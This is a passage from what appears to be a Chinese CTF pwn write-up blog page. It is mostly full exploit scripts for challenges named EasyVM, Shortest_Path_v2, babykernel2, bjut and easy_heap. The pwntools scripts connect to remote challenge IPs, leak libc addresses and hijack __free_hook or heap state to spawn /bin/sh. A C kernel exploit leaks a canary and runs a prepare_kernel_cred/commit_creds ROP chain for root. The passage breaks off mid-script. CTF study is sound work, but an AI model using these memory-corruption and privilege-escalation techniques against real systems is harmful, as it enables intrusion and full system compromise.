class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./EasyVM'</span>)</span><br><span class="line">    <span class="comment">#p=t.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'121.36.215.224'</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mbreak</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x99'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x71'</span>+p32(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x53'</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x76'</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span><span class="params">(idx,v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x80'</span>+chr(idx)+p32(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ptr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x11'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gift</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x09'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">(s)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    se(s)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">shellcode = get_gift() + print_ptr() + mbreak()</span><br><span class="line">gift()</span><br><span class="line">enter(shellcode)</span><br><span class="line">start()</span><br><span class="line">pbase = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; \n'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    shellcode += mov(<span class="number">3</span>, pbase+ <span class="number">0x2FDC</span>+i) + putchr()</span><br><span class="line">shellcode += mbreak()</span><br><span class="line">enter(shellcode)</span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line">libc = u32(ru(<span class="string">'1.'</span>)[:<span class="number">-2</span>])</span><br><span class="line">base = libc - <span class="number">0x18540</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; \n'</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">shellcode = mov(<span class="number">6</span>, base + e.symbols[<span class="string">'__free_hook'</span>] +<span class="number">4</span>) + push(base + e.symbols[<span class="string">'system'</span>]) + mov(<span class="number">10</span>, base+e.search(<span class="string">'/bin/sh'</span>).next())+ mbreak()</span><br><span class="line">enter(shellcode)</span><br><span class="line">start()</span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; \n'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(pbase))</span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="shotest_path_v2">Shotest_Path_v2</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./Shortest_path'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'121.37.181.246'</span>, <span class="number">19008</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id,price,sz,name,connection=[])</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'ID:'</span>)</span><br><span class="line">    sl(str(id))</span><br><span class="line">    ru(<span class="string">'Price:'</span>)</span><br><span class="line">    sl(str(price))</span><br><span class="line">    ru(<span class="string">'Length:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Name:'</span>)</span><br><span class="line">    se(name)</span><br><span class="line">    ru(<span class="string">'station:'</span>)</span><br><span class="line">    sl(str(len(connection)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> connection:</span><br><span class="line">        ru(<span class="string">'ID:'</span>)</span><br><span class="line">        sl(str(i[<span class="number">0</span>]))</span><br><span class="line">        ru(<span class="string">'distance:'</span>)</span><br><span class="line">        sl(str(i[<span class="number">1</span>]))</span><br><span class="line">ru(<span class="string">'---&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'ID:'</span>)</span><br><span class="line">    sl(str(id))</span><br><span class="line">    ru(<span class="string">'---&gt;'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'---&gt;'</span>)</span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    tt.append((i,<span class="number">-1</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x27</span>,<span class="string">'a'</span>,[(<span class="number">1</span>,<span class="number">-2</span>)])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x27</span>,<span class="string">'b'</span>,tt)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    add(i+<span class="number">11</span>,<span class="number">3</span>,<span class="number">0x27</span>,<span class="string">'c'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">29</span>)</span><br><span class="line">add(<span class="number">40</span>,<span class="number">2</span>,<span class="number">0x17</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6068E0</span>))</span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'ID:'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'ID:'</span>)</span><br><span class="line">sl(<span class="string">'28'</span>)</span><br><span class="line">ru(<span class="string">'---&gt;'</span>)</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'ID:'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="babykernel">babykernel</span></h2><p>非预期解。。搜索flag即可 <img src="https://i.loli.net/2020/03/10/ogxfDcGTHZXpbrW.png" alt="babykernel.png"> 内容 ## babykernel2 存在整数溢出，然后有canary，常规的泄漏canary然后rop回到用户态即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;assert.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;signal.h&gt;</span></span><br><span class="line">// <span class="number">0xffffffff810779b0</span> prepare_kernel_cred</span><br><span class="line">// <span class="number">0xffffffff81077620</span> commit_creds</span><br><span class="line">//<span class="number">0xffffffff811b771d</span> : pop rdi ; ret</span><br><span class="line">//<span class="number">0xffffffff8122f802</span> : pop rdx ; ret</span><br><span class="line">//<span class="number">0xffffffff810aa626</span> : mov rdi, rax ; call rdx</span><br><span class="line">//<span class="number">0xffffffff813345db</span> : swapgs ; pop rbp ; ret</span><br><span class="line">//<span class="number">0xffffffff818e8977</span>:   <span class="number">48</span> cf                   iretq</span><br><span class="line">unsigned long cmd1 = <span class="number">0x30001</span>;</span><br><span class="line">unsigned long cmd2 = <span class="number">0x30002</span>;</span><br><span class="line">unsigned long cmd3 = <span class="number">0x30000</span>;</span><br><span class="line">unsigned long base = <span class="number">0</span>;</span><br><span class="line">unsigned long prepare_kernel_cred;</span><br><span class="line">unsigned long commit_creds;</span><br><span class="line">unsigned long p_rdi;</span><br><span class="line">unsigned long p_rdx;</span><br><span class="line">unsigned long swapgs_rbp;</span><br><span class="line">unsigned long iretq;</span><br><span class="line">unsigned long mov_ca;</span><br><span class="line">size_t user_cs, user_ss, user_eflags, user_sp;</span><br><span class="line">void save_stats() &#123;</span><br><span class="line">asm(</span><br><span class="line">    <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">    <span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"popq %2\n"</span></span><br><span class="line">    :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line">    :</span><br><span class="line">    : <span class="string">"memory"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void shell(void) &#123;</span><br><span class="line">    setuid(geteuid());</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">unsigned long rop[<span class="number">0x200</span>];</span><br><span class="line">int main()&#123;</span><br><span class="line">    signal(SIGSEGV,shell);</span><br><span class="line">    save_stats();</span><br><span class="line">    printf(<span class="string">"Leave me a address:"</span>);</span><br><span class="line">    scanf(<span class="string">"%lx"</span>,&amp;amp;base);</span><br><span class="line">    prepare_kernel_cred = base + <span class="number">0xa1820</span>;</span><br><span class="line">    commit_creds = base +<span class="number">0xa1436</span>;//<span class="number">0xa1430</span></span><br><span class="line">    p_rdi = base +<span class="number">0x3ee37f</span>;</span><br><span class="line">    p_rdx = base +<span class="number">0x83f22</span>;</span><br><span class="line">    swapgs_rbp = base +<span class="number">0x636b4</span>;</span><br><span class="line">    iretq =base +<span class="number">0x81d217</span>;</span><br><span class="line">    mov_ca = base +<span class="number">0xdef79</span>;</span><br><span class="line">    int fd = open(<span class="string">"/dev/babyhacker"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        puts(<span class="string">"open fail!"</span>);</span><br><span class="line">        exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    unsigned long tt[<span class="number">0x200</span>];</span><br><span class="line">    tt[<span class="number">0</span>] = <span class="number">0x6161616161616161</span>UL;</span><br><span class="line">    <span class="keyword">for</span>(int i = <span class="number">1</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">        tt[i] = <span class="number">0x6161616161616161</span>UL;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,cmd3,<span class="number">-65200</span>);</span><br><span class="line">    ioctl(fd,cmd2,tt);</span><br><span class="line">    unsigned long canary = tt[<span class="number">40</span>];</span><br><span class="line">    printf(<span class="string">"canary is %p"</span>,canary);</span><br><span class="line">    ioctl(fd,cmd3,<span class="number">-65088</span>);</span><br><span class="line">    <span class="keyword">for</span>(int i = <span class="number">1</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">        tt[i] = <span class="number">0x6161616161616161</span>UL;</span><br><span class="line">    &#125;</span><br><span class="line">    tt[<span class="number">40</span>] = canary;</span><br><span class="line">    tt[<span class="number">41</span>] =<span class="number">0x0</span>UL;</span><br><span class="line">    tt[<span class="number">42</span>] =p_rdi;</span><br><span class="line">    tt[<span class="number">43</span>] = <span class="number">0x0</span>UL;</span><br><span class="line">    tt[<span class="number">44</span>] = prepare_kernel_cred;</span><br><span class="line">    tt[<span class="number">45</span>] = p_rdx;</span><br><span class="line">    tt[<span class="number">46</span>] = commit_creds;</span><br><span class="line">    tt[<span class="number">47</span>] = mov_ca;</span><br><span class="line">    tt[<span class="number">48</span>] = swapgs_rbp;</span><br><span class="line">    tt[<span class="number">49</span>] = <span class="number">0xdeadbeef</span>UL;</span><br><span class="line">    tt[<span class="number">50</span>] = iretq;</span><br><span class="line">    tt[<span class="number">51</span>] = (unsigned long) shell;</span><br><span class="line">    tt[<span class="number">52</span>] += user_cs;</span><br><span class="line">    tt[<span class="number">53</span>] += user_eflags;</span><br><span class="line">    tt[<span class="number">54</span>] += user_sp;</span><br><span class="line">    tt[<span class="number">55</span>] += user_ss;</span><br><span class="line">//cat /proc/kallsyms | grep startup_64commit_creds +<span class="number">0xa1430</span> :startup_64</span><br><span class="line">//prepare_kernel_cred+<span class="number">0xa1820</span></span><br><span class="line">//pop rdi:+<span class="number">0xba20b6</span>  ; </span><br><span class="line">//pop rdx:+<span class="number">0x83f22</span> ;</span><br><span class="line">//+<span class="number">0x636b4</span> : swapgs ; pop rbp ; ret</span><br><span class="line">    ioctl(fd,cmd1,tt);</span><br><span class="line">    printf(<span class="string">"cmd1 done!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="bjut">bjut</span></h2><p>不断尝试会发现又一个负数溢出，然后会leak出一些东西，这些东西里面有个stdin,stdout,stderr的地址，用来搜一下即可。然后再对那个地址覆盖一下即可。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">"121.37.167.199"</span>,<span class="number">9997</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The length of your hw:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input your hw:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The index of your hw:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The index of your hw:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Input your hw:"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The index of your hw:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"><span class="comment">#size &lt; 0x80</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">show(<span class="number">-1879</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">data = p.recv()</span><br><span class="line">libc_addr =  u64(data[<span class="number">0x91</span>:<span class="number">0x91</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x1e5760</span></span><br><span class="line">edit(<span class="number">-1879</span>,p64( <span class="number">0x052fd0</span>+libc_addr))</span><br><span class="line"><span class="comment">#0x052fd0 2.29 0x1e5760</span></span><br><span class="line"><span class="comment">#0x050300 2.28 0x1e5760</span></span><br><span class="line"><span class="comment">#0x04f440 2.27 0x3ec760</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2><span id="easy_heap">easy_heap</span></h2><p>先申请了0x10的堆块，并且没有对申请出来的堆块进行初始化，可以遗留一些地址造成堆块的uaf然后致使最后产生任意地址写，泄漏就更改stdout即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">"./easyheap"</span>)</span><br><span class="line">a = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="comment">#p = remote("121.36.209.145",9997)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content,flag)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"How long is this message?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        p.recvuntil(<span class="string">"What is the content of the message?"</span>)</span><br><span class="line">        p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"What is the index of the item to be deleted?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"What is the index of the item to be modified?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"What is the content of the message?"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"a"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">"b"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"a"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">"b"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>,<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x401</span>,<span class="string">"a"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"a"</span>,<span 